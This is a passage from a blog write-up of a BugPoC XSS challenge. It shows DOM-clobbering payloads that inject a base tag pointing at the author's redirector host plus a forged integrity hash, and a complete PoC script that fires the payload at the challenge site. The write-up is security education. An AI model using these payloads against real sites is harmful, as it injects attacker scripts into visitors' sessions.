+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">title</span><span style="color: #F8F8F2">>&#x3C;</span><span style="color: #F92672">base</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"</span><span style="color: #F44747">&#x3C;</span><span style="color: #E6DB74">Flexible Redirector URL>"</span><span style="color: #F44747">/</span><span style="color: #F8F8F2"> >&#x3C;</span><span style="color: #F92672">input</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"fileIntegrity"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">value</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"XpEJ+gEKwLPGlQTkMq/oT4qqwYsW7CzN2xMej0tkB4M="</span><span style="color: #F8F8F2">/></span></span></code></pre>
+<p>Validation with encoded hash and my own <code>Flexible Redirector</code> URL:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">title</span><span style="color: #F8F8F2">>&#x3C;</span><span style="color: #F92672">base</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"https://ax42v6dh5jj4.redir.bugpoc.ninja"</span><span style="color: #F8F8F2"> />&#x3C;</span><span style="color: #F92672">input</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"fileIntegrity"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">value</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"XpEJ%2BgEKwLPGlQTkMq%2FoT4qqwYsW7CzN2xMej0tkB4M%3D"</span><span style="color: #F8F8F2">/></span></span></code></pre>
+<h2 id="creating-the-complete-proof-of-concept">Creating the complete Proof-of-Concept</h2>
+<p>All steps to exploit the XSS we used BugPoC’s tools, but we cannot forget we need to define the content of <code>window.name</code> to <code>iframe</code> before.</p>
+<p>Access the front-end template in <a href="https://bugpoc.com/testers/front-end" target="_blank" rel="noopener noreferrer">BugPoc site</a>.</p>
+<p>PoC code:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">script</span><span style="color: #F8F8F2">></span></span>
+<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">exploit</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">callback</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">  window.name </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"iframe"</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> url </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"https://wacky.buggywebsite.com/frame.html?param="</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> hash </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`XpEJ+gEKwLPGlQTkMq/oT4qqwYsW7CzN2xMej0tkB4M=`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> baseURL </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"https://ax42v6dh5jj4.redir.bugpoc.ninja"</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> payload </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`&#x3C;/title>&#x3C;base href="</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">baseURL</span><span style="color: #F92672">}</span><span style="color: #E6DB74">"/ >&#x3C;input id="fileIntegrity" value="</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">hash</span><span style="color: #F92672">}</span><span style="color: #E6DB74">"/>`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  window.location </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">url</span><span style="color: #F92672">}${</span><span style="color: #A6E22E">encodeURIComponent</span><span style="color: #F8F8F2">(payload)</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">script</span><span style="color: #F8F8F2">></span></span></code></pre>
+<p>To avoid errors with URL, the function <code>encodeURIComponent</code> is called to make the URL encode.</p>
+<p><img src="/images/bugpoc-xss-challenge4-xss.gif" alt="PoC"></p>
+<p><strong>My own PoC:</strong></p>
+<ul>
+<li>PoC ID: <a href="https://bugpoc.com/poc#bp-k9VfGeUs" target="_blank" rel="noopener noreferrer">bp-k9VfGeUs</a>.</li>
+<li>PoC password: <code>soRRypOOdlE99</code>.</li>
+</ul>
+<h2 id="conclusions--considerations">Conclusions &#x26; Considerations</h2>
+<p>The challenge was pretty much fun. I could review and practice a lot of my skills, in specific, DOM clobbering.</p>
+<p>If you have some doubts or want to give me some feedback, DM me on <a href="https://twitter.com/EffectRenan" target="_blank" rel="noopener noreferrer">Twitter</a>. Thanks!</p>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Glossary/Global_object" target="_blank" rel="noopener noreferrer">Global object - MDN web docs</a></li>
+<li><a href="https://developers.google.com/web/fundamentals/security/csp" target="_blank" rel="noopener noreferrer">Content Security Policy - Google Developers</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target="_blank" rel="noopener noreferrer">Subresource Integrity - MDN web docs</a></li>
+<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener noreferrer">DOM clobbering - PortSwigger</a></li>
+<li><a href="https://developer.mozilla.org/pt-BR/docs/Web/HTML/Element/iframe" target="_blank" rel="noopener noreferrer">Iframe - MDN web docs</a></li>
+</ol>
+<hr>
+<h2 id="discuss-on-twitter">Discuss on Twitter</h2>
+<center>
+<a href="https://twitter.com/EffectRenan?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-dnt="true" data-show-count="false">Follow @EffectRenan</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</center>
+<blockquote align="center" class="twitter-tweet"><p lang="en" dir="ltr">Write-up for XSS challenge <a href="https://twitter.com/bugpoc_official?ref_src=twsrc%5Etfw">@bugpoc_official</a> <a href="https://twitter.com/amazon?ref_src=twsrc%5Etfw">@amazon</a> <a href="https://t.co/79CqLNvM0r">https://t.co/79CqLNvM0r</a><a href="https://twitter.com/hashtag/XSS?src=hash&#x26;ref_src=twsrc%5Etfw">#XSS</a> <a href="https://t.co/c21yPvTWz5">pic.twitter.com/c21yPvTWz5</a></p>— Renan Rocha (@EffectRenan) <a href="https://twitter.com/EffectRenan/status/1326349243301449729?ref_src=twsrc%5Etfw">November 11, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 
+    </div>
+  </body></html>
